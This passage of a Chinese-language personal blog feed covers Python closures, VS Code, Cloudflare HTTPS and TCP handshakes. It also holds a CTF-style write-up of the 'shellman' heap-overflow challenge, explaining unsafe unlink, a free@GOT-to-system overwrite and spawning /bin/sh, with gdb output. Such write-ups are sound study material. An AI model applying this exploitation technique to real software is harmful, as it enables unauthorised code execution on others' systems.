<h2 class="anchor anchorWithStickyNavbar_K1VF" id="今年">今年<a href="https://vienna.bio/blog/2017-Happy-New-Year-%E6%96%B0%E5%B9%B4%E5%A5%BD#%E4%BB%8A%E5%B9%B4" class="hash-link" aria-label="Direct link to 今年" title="Direct link to 今年">​</a></h2>
<p>好, 那就新年快乐！</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[重新对博客启用 HTTPS]]></title>
        <id>https://vienna.bio/blog/重新对博客启用-HTTPS</id>
        <link href="https://vienna.bio/blog/重新对博客启用-HTTPS"/>
        <updated>2016-12-31T20:30:57.000Z</updated>
        <summary type="html"><![CDATA[Cloudflare 提供 DNS 解析服务，其中免费 Plan 包含 HTTPS 支持，遂把 DNS 转移，就这样。]]></summary>
        <content type="html"><![CDATA[<p><a href="https://www.cloudflare.com/" target="_blank" rel="noopener noreferrer">Cloudflare</a> 提供 DNS 解析服务，其中免费 Plan 包含 HTTPS 支持，遂把 DNS 转移，就这样。</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Visual Studio Code 挺好用的]]></title>
        <id>https://vienna.bio/blog/Visual-Studio-Code-挺好用的</id>
        <link href="https://vienna.bio/blog/Visual-Studio-Code-挺好用的"/>
        <updated>2016-11-19T14:15:30.000Z</updated>
        <summary type="html"><![CDATA[我在 macOS 上要开发一些简单的 C/C++, 不想要完备的 IDE, 一个编辑器就很方便。]]></summary>
        <content type="html"><![CDATA[<p>我在 macOS 上要开发一些简单的 C/C++, 不想要完备的 IDE, 一个编辑器就很方便。</p>
<p>可是我还想要一些有用的开发插件例如智能代码提示、智能引用、快捷键构建之类。<br>
<!-- -->这些功能其实任何编辑器依靠广大群众的智慧也有各种好的解决方案，VCS 则是更简单就可以配置到足够好，而且免费。</p>
<p>刚安装好的 VCS 就已经带备 Git 插件，常用的 Commit 和 Push 等都可以直接 GUI 操作。<br>
<!-- -->往 Marketplace 搜索安装安装 vim, cpptools, clang 之类都是简单操作，youcompleteme 则需要现在外部完成安装。<br>
<!-- -->如果打开的是一个文件夹，则可以新建.vscode 文件夹存放项目配置，比如 include path，获取更全面的cross reference</p>
<p>总的来说很配合暂时的需求，体验不错。<br>
<!-- -->此处应该有些图。</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[这样理解 Python 闭包]]></title>
        <id>https://vienna.bio/blog/这样理解-Python-闭包</id>
        <link href="https://vienna.bio/blog/这样理解-Python-闭包"/>
        <updated>2016-08-23T21:02:36.000Z</updated>
        <summary type="html"><![CDATA[看了 12 步轻松搞定 python 装饰器 里的描述后，对『closure 是上下文』有了些形象的理解，一些应用了 closure 的实践可以参考文章里的一些例子，例如函数参数定制生成，装饰器功能等]]></summary>
        <content type="html"><![CDATA[<p>看了 <a href="http://python.jobbole.com/81683/" target="_blank" rel="noopener noreferrer">12 步轻松搞定 python 装饰器</a> 里的描述后，对『closure 是上下文』有了些形象的理解，一些应用了 closure 的实践可以参考文章里的一些例子，例如函数参数定制生成，装饰器功能等</p>
<div class="language-py codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-py codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">g_var </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">outer</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    loc_var </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">inner</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'I can access g_var: %s, loc_var: %s'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">g_var</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> loc_var</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> inner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">in_fun </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> outer</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 内层使用到的[外层函数的本地变量]会加入到 func 对象的 __closure__ tuple 里面</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_fun</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">__closure__</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 全局变量不包含在 closure tuple，并不是副本</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">g_var </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 效果就是 in_fun 本身函数内的代码，加上 __closure__ 里的上下文副本实现了 closure 功能</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">in_fun</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 也就是说 __closure__ tuple 包含一个 cell 元素，cell 装有外层的 loc_var，值是 30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'There is %d cell inside'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_fun</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">__closure__</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'This cell contain %d'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> in_fun</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">__closure__</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cell_contents</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="Python" term="Python"/>
        <category label="closure" term="closure"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[shellman 一个 Linux 堆溢出利用例题的分析]]></title>
        <id>https://vienna.bio/blog/shellman-一个-Linux-堆溢出利用例题的分析</id>
        <link href="https://vienna.bio/blog/shellman-一个-Linux-堆溢出利用例题的分析"/>
        <updated>2016-07-21T16:43:00.000Z</updated>
        <summary type="html"><![CDATA[ALARM signal 自动退出程序]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_K1VF" id="alarm-signal-自动退出程序">ALARM signal 自动退出程序<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#alarm-signal-%E8%87%AA%E5%8A%A8%E9%80%80%E5%87%BA%E7%A8%8B%E5%BA%8F" class="hash-link" aria-label="Direct link to ALARM signal 自动退出程序" title="Direct link to ALARM signal 自动退出程序">​</a></h2>
<p>首先把玩一下，发现有个 alarm 事件令程序在一分钟后退出，这里在二进制修改一下时间值去掉这个小玩意，并不会影响后续堆溢出的分析。</p>
<p>时间值在 main 函数上作为立即数传给 alarm，用 IDA 或别的反汇编工具可以看到
一时间没有好用的二进制编辑，发现用 vi 也非常方便
<a href="https://www.zhihu.com/question/22281280/answer/34778466" target="_blank" rel="noopener noreferrer">https://www.zhihu.com/question/22281280/answer/34778466</a></p>
<p><img decoding="async" loading="lazy" alt="ALARM signal 时长" src="https://vienna.bio/assets/images/alarm-540c1e0221c12485a009bfa4cca3cdb3.png" width="940" height="284" class="img_GQDY"></p>
<p>之后的动态分析会用这个修改过的 shellman_noalarm 就不会一分钟后退出，看了网上一些介绍 gdb 可以屏蔽 ALARM signal， 也是可行方法吧。</p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="用-ida-了解关键功能和资料">用 IDA 了解关键功能和资料<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E7%94%A8-ida-%E4%BA%86%E8%A7%A3%E5%85%B3%E9%94%AE%E5%8A%9F%E8%83%BD%E5%92%8C%E8%B5%84%E6%96%99" class="hash-link" aria-label="Direct link to 用 IDA 了解关键功能和资料" title="Direct link to 用 IDA 了解关键功能和资料">​</a></h2>
<p>** 大多数小笔记注释在 IDA 的数据库文件上</p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="新增条目">新增条目<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E6%96%B0%E5%A2%9E%E6%9D%A1%E7%9B%AE" class="hash-link" aria-label="Direct link to 新增条目" title="Direct link to 新增条目">​</a></h4>
<p>新增 shellcode，分配内存后会按输入的 size 准确地接收输入并填充</p>
<p><img decoding="async" loading="lazy" alt="新 shellcode 的 size" src="https://vienna.bio/assets/images/new_size-bd66cdd19d46c967d257452b5dfd92f4.png" width="940" height="111" class="img_GQDY"></p>
<p>在新增 shellcode 的这个函数里，可以发现总 shellcode 的 counter 全局变量和一个全局数组用来储存每条 record 的资料。</p>
<p><img decoding="async" loading="lazy" alt="全局 struct 数组" src="https://vienna.bio/assets/images/new_struct-199ec9152cd9c734b76bbe09b68dae3b.png" width="940" height="166" class="img_GQDY"></p>
<p>这个全局数组是这次利用的关键之一，从 IDA 上看还可以知道
数组起始地址：0x6016C0
新增条目时循环256 次检查有没有空位，意味着是个 size = 256 的数组
按新增条目的代码来看，结构是</p>
<div class="language-cpp codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-cpp codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">record</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	QWORD is_allocated</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	QWORD length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	QWORD malloc_ptr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="全局 struct 数组" src="https://vienna.bio/assets/images/new_struct2-82d91e13c50d77a7996ba86594b71dd6.png" width="940" height="407" class="img_GQDY"></p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="删除条目">删除条目<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E5%88%A0%E9%99%A4%E6%9D%A1%E7%9B%AE" class="hash-link" aria-label="Direct link to 删除条目" title="Direct link to 删除条目">​</a></h4>
<p>按输入的 index 从全局数组中找到 record，检查是否已分配状态，如果是就进行一段重设和 free 掉内存</p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="编辑条目">编辑条目<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E7%BC%96%E8%BE%91%E6%9D%A1%E7%9B%AE" class="hash-link" aria-label="Direct link to 编辑条目" title="Direct link to 编辑条目">​</a></h4>
<p>漏洞出现在这个功能里面。
获取到条目的数据地址和准备要编辑的长度后，不做任何内存重新分配直接在原地址上按新的数据长度读入数据，这里造成可以覆盖下一个 chunk 的 metadata 进而利用漏洞。</p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="漏洞利用">漏洞利用<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" class="hash-link" aria-label="Direct link to 漏洞利用" title="Direct link to 漏洞利用">​</a></h2>
<p>这是典型的 unsafe_unlink 情况，参考了
<a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c" target="_blank" rel="noopener noreferrer">https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c</a>
<a href="http://winesap.logdown.com/posts/258859-0ctf-2015-freenote-write-up" target="_blank" rel="noopener noreferrer">http://winesap.logdown.com/posts/258859-0ctf-2015-freenote-write-up</a></p>
<p>新增3项条目，都是128 bytes 大小，因为小过128 的话 malloc 不会从 top chunk 上分割，分配出来的 chunk 就不是连续的</p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="欺骗第二项让其和假的-chunk-进行合并">欺骗第二项让其和假的 chunk 进行合并<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E6%AC%BA%E9%AA%97%E7%AC%AC%E4%BA%8C%E9%A1%B9%E8%AE%A9%E5%85%B6%E5%92%8C%E5%81%87%E7%9A%84-chunk-%E8%BF%9B%E8%A1%8C%E5%90%88%E5%B9%B6" class="hash-link" aria-label="Direct link to 欺骗第二项让其和假的 chunk 进行合并" title="Direct link to 欺骗第二项让其和假的 chunk 进行合并">​</a></h4>
<p>编辑第一项时覆盖第二项的 metadata ，包括精心设计的 prev_size 和 inuse 标志位</p>
<p>按照 libc 的 P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd ==P 特性的检查，</p>
<p>P-&gt;fd == P – 24,, P-&gt;bk == P-16 (bk 和 fd 分别是第四个和第三个结构位置)</p>
<p>为了满足这个检测，需要一个指向假 chunk 的已知位置，所以前面说那个全局数组是这种堆溢出利用关键之处。</p>
<p>全局数组[0].malloc_ptr 已经指向伪造 chunk 的首地址，那按上面说的布置一下内容，把 P- 24 的值放到伪 chunk 的 bk 处，P-16 的值放到伪 chunk 的 fd 处，要覆盖的第二项里的 prev_size 本来是0x80 + 0x10 (内存大小和 metadata 大小)，现在缩小一下把 prev_size 覆盖成0x80 让第二项以为前面有0x80 bytes 空闲块。</p>
<p>删掉第二项触发 free –&gt; 触发 unlink</p>
<p>P-&gt;fd-&gt;bk  = P-&gt;bk   // 双向链表的 node 删除，但这里P-&gt;fd-&gt;bk  就是项目一在数组上存着的地址，就是全局数组[0].malloc_ptr 的值，现在被替换成 &amp;全局数组[0].malloc_ptr – 3 了，我们依然可以编辑项目一的内容，程序会从&amp;全局数组[0].malloc_ptr – 3 处开始读写。</p>
<p>至此我们可以控制关键的全局数组的内容，达至任意地址读写。</p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="替换-free-的地址变成-system">替换 free 的地址变成 system<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E6%9B%BF%E6%8D%A2-free-%E7%9A%84%E5%9C%B0%E5%9D%80%E5%8F%98%E6%88%90-system" class="hash-link" aria-label="Direct link to 替换 free 的地址变成 system" title="Direct link to 替换 free 的地址变成 system">​</a></h4>
<p>从 IDA 或别的工具可得 free 的 GOT 地址在 0x601600, 程序跑起来后实际 free 函数地址会填充进来</p>
<p><img decoding="async" loading="lazy" alt="free 在 GOT 上的地址" src="https://vienna.bio/assets/images/free_GOT-2ca7ca3bc33c58e3d797a44e6253ade7.png" width="940" height="129" class="img_GQDY"></p>
<p>用 gdb 把程序跑起来后，用断点获取 system 地址</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ x 0x601600</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x601600 &lt;free@got.plt&gt;:    0x00007ffff7a91a70</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ b system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 3 at 0x7ffff7a53380</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同一个libc 两个函数的差值是一样的</p>
<p>&gt;&gt;&gt; hex(0x00007ffff7a91a70 - 0x7ffff7a53380)
'0x3e6f0'</p>
<p>利用任意地址读写（更改数组项目的 ptr 指向，再 list 出内容或编辑回去 ），可以读出 free@GOT 的地址值，然后利用和 system 的差值固定这一特性计算 system 地址，再写回去覆盖 free 的函数地址值，至此完成函数地址替换。</p>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="触发freesystem拿-shell">触发free（system）拿 shell<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E8%A7%A6%E5%8F%91freesystem%E6%8B%BF-shell" class="hash-link" aria-label="Direct link to 触发free（system）拿 shell" title="Direct link to 触发free（system）拿 shell">​</a></h4>
<p>一时没想到 free 也是带参数的，只需要把 system 的字符串参数放在原来要 free 的地址上，其实就是 system (addr) 了，也就是说直接把”/bin/sh” 放到一个正常的条目里，这时 free 掉这个条目，就会执行 system(“/bin/sh”);</p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="全局数组的变化">全局数组的变化<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E5%85%A8%E5%B1%80%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%98%E5%8C%96" class="hash-link" aria-label="Direct link to 全局数组的变化" title="Direct link to 全局数组的变化">​</a></h2>
<p>一开始分配了3个0x80 的情况
<img decoding="async" loading="lazy" alt="一开始分配了3个0x80 的情况" src="https://vienna.bio/assets/images/gdb1-45330f1ee323b3c0e5e5ef05446dc904.png" width="888" height="198" class="img_GQDY"></p>
<p>第二项条目在被覆盖 metadata 前的状态
<img decoding="async" loading="lazy" alt="第二项条目在被覆盖 metadata 前的状态" src="https://vienna.bio/assets/images/gdb2-9db39b545c9896f005e07dc33e2e2300.png" width="940" height="500" class="img_GQDY"></p>
<p>执行覆盖后，第二项的inuse 标志位和 prev_size 被改，而第一项里的假 chunk 也准备好了
<img decoding="async" loading="lazy" alt="被覆盖后" src="https://vienna.bio/assets/images/gdb3-64e8c3003c90b1847d993378ef62086e.png" width="940" height="446" class="img_GQDY"></p>
<p>执行第二项的free 触发 unlink ， 第一项的地址变成在全局数组稍前的位置（编辑它就可以控制全局数组）
<img decoding="async" loading="lazy" alt="触发 unlink 后" src="https://vienna.bio/assets/images/gdb4-2e1869b3fddf23eb81c77ba60fa77fc6.png" width="927" height="275" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="触发 unlink 后" src="https://vienna.bio/assets/images/gdb5-ec901b60594e8f8e37c60cb1644748b2.png" width="636" height="525" class="img_GQDY"></p>
<p>此时控制全局数组让第二项变成 free@GOT, 进而读取函数地址
<img decoding="async" loading="lazy" alt="全局数组的情况" src="https://vienna.bio/assets/images/gdb6-68b2f782ecca9f49e8ef8192ffdd0f6e.png" width="933" height="252" class="img_GQDY"></p>
<p>list 功能查看 free 地址，计算system 地址可以用编辑功能替换
<img decoding="async" loading="lazy" alt="使用任意读查看 free 的地址" src="https://vienna.bio/assets/images/gdb7-bb126c05d52aa6076a21176ff456508a.png" width="940" height="639" class="img_GQDY"></p>
<p>最后把”/bin/sh” 放在一个正常的条目里，然后 delete 掉就会触发 system(“/bin/sh”)
<img decoding="async" loading="lazy" alt="执行 system(“/bin/sh”) 后" src="https://vienna.bio/assets/images/gdb8-c17b0e9633ea4017d9fa56ba7e3a02a4.png" width="394" height="394" class="img_GQDY"></p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="参考">参考<a href="https://vienna.bio/blog/shellman-%E4%B8%80%E4%B8%AA-Linux-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%BE%8B%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90#%E5%8F%82%E8%80%83" class="hash-link" aria-label="Direct link to 参考" title="Direct link to 参考">​</a></h2>
<p><a href="https://www.zhihu.com/question/22281280/answer/34778466" target="_blank" rel="noopener noreferrer">https://www.zhihu.com/question/22281280/answer/34778466</a>
<a href="http://www.slideshare.net/AngelBoy1/heap-exploitation-51891400" target="_blank" rel="noopener noreferrer">http://www.slideshare.net/AngelBoy1/heap-exploitation-51891400</a>
<a href="http://drops.wooyun.org/tips/16610" target="_blank" rel="noopener noreferrer">http://drops.wooyun.org/tips/16610</a>
<a href="http://drops.wooyun.org/tips/7326" target="_blank" rel="noopener noreferrer">http://drops.wooyun.org/tips/7326</a>
<a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c" target="_blank" rel="noopener noreferrer">https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c</a>
<a href="http://winesap.logdown.com/posts/258859-0ctf-2015-freenote-write-up" target="_blank" rel="noopener noreferrer">http://winesap.logdown.com/posts/258859-0ctf-2015-freenote-write-up</a></p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[理解 TCP 的三次握手、四次挥手]]></title>
        <id>https://vienna.bio/blog/理解-TCP-的三次握手、四次挥手</id>
        <link href="https://vienna.bio/blog/理解-TCP-的三次握手、四次挥手"/>
        <updated>2016-06-27T11:11:03.000Z</updated>
        <summary type="html"><![CDATA[三次握手是这样]]></summary>
        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_K1VF" id="三次握手是这样">三次握手是这样<a href="https://vienna.bio/blog/%E7%90%86%E8%A7%A3-TCP-%E7%9A%84%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E3%80%81%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E6%98%AF%E8%BF%99%E6%A0%B7" class="hash-link" aria-label="Direct link to 三次握手是这样" title="Direct link to 三次握手是这样">​</a></h3>
<p>第一次（客户端 to 服务端）：我想建立连接，你听到吗？
如果服务端收到第一次握手的请求后，则可以确认：[客户端 to 服务端] 是畅通的。
客户端还不知道任何是否畅通的情况</p>
<p>第二次（服务端 to 客户端）：我收到你的请求了，可以建立连接啊，你听得到吗？
此时，服务端可以确认的事情是：[客户端 to 服务端] 是畅通的。
客户端如果收到第二次握手的服务端回复后，则可以确认 [客户端 to 服务端], [服务端 to 客户端] 都是畅通的。</p>
<p>第三次（客户端 to 服务端）：我听到你说可以建立连接了。
上面已经确认了[客户端 to 服务端] 是畅通的，这个包不会有问题。
此时如果服务端收到确认后，知道的事情有：[客户端 to 服务端]，[服务端 to 客户端] 都是畅通，
而客户端也知道 [客户端 to 服务端], [服务端 to 客户端] 都是畅通。</p>
<p>好的，三次握手确认了双方畅通。</p>
